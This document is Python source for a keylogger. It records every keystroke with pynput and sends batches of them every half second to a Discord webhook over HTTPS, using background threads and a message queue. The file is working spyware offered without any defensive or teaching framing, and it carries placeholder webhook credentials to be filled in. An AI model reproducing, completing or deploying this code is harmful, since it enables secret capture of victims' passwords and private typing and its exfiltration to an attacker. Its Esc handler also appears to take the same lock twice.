import json
import http.client
from pynput import keyboard
import time
import threading
import queue  # Import the queue module
import sys

# Replace with your actual Discord Webhook URL (including the full URL)
WEBHOOK_URL = "discord.com"
WEBHOOK_PATH = "/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"  # Replace with your actual webhook ID and token. **YOU MUST CHANGE THIS**

# Improved key name mapping for better readability
KEY_NAME_MAPPING = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.ctrl: "[CTRL]",
    keyboard.Key.alt: "[ALT]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.tab: "[TAB]",
}

# Global variables
key_buffer = []
buffer_lock = threading.Lock()
# SEND_BUFFER_SIZE = 10  #  Removed -  handled by queue now
SEND_INTERVAL = 0.5
message_queue = queue.Queue()  # Use a queue for messages
MAX_QUEUE_SIZE = 100 # Maximum number of messages allowed in the queue

# Function to send the captured keystrokes to Discord
def send_to_discord(message):
    data = {'content': message}
    json_data = json.dumps(data)

    try:
        connection = http.client.HTTPSConnection(WEBHOOK_URL)
        headers = {"Content-Type": "application/json"}
        connection.request("POST", WEBHOOK_PATH, body=json_data, headers=headers)
        response = connection.getresponse()

        if 200 <= response.status < 300:
            print('Message sent successfully!')
        else:
            print(f"Failed to send message. Status: {response.status}")
            print(f"Response: {response.read().decode()}")
        connection.close()
    except Exception as e:
        print(f"Error sending data to Discord: {e}")

# Function to handle key press event
def on_press(key):
    try:
        key_str = str(key.char)
    except AttributeError:
        key_str = KEY_NAME_MAPPING.get(key, str(key))

    with buffer_lock:
        key_buffer.append(key_str)  # Append to the buffer
        #  No longer send directly here

# Function to stop the keylogger on escape key press
def on_release(key):
    if key == keyboard.Key.esc:
        with buffer_lock:
            send_buffered_data()  # send any remaining keys
        return False

def send_buffered_data():
    """Sends the keys in the buffer to Discord and clears the buffer."""
    global key_buffer
    with buffer_lock:
        if key_buffer:
            message = "".join(key_buffer)
            if message_queue.qsize() < MAX_QUEUE_SIZE: # check the queue size
                message_queue.put(message)  # Put message in queue
            else:
                print("Message queue is full.  Discarding data.") #handle full queue
            key_buffer = []

def send_messages_from_queue():
    """Sends messages from the queue to Discord."""
    while True:
        try:
            message = message_queue.get(timeout=5)  # Get message from queue (with timeout)
            send_to_discord(message)
            message_queue.task_done()
        except queue.Empty:
            pass # Handle timeout, do nothing, check again.

def send_buffer_periodically():
    """Function to send the buffer every SEND_INTERVAL seconds."""
    while True:
        time.sleep(SEND_INTERVAL)
        send_buffered_data()

# Collect events and start listening for keystrokes
if __name__ == "__main__":
    # Start the timer thread
    timer_thread = threading.Thread(target=send_buffer_periodically, daemon=True)
    timer_thread.start()

    # Start the message sending thread
    queue_thread = threading.Thread(target=send_messages_from_queue, daemon=True)
    queue_thread.start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
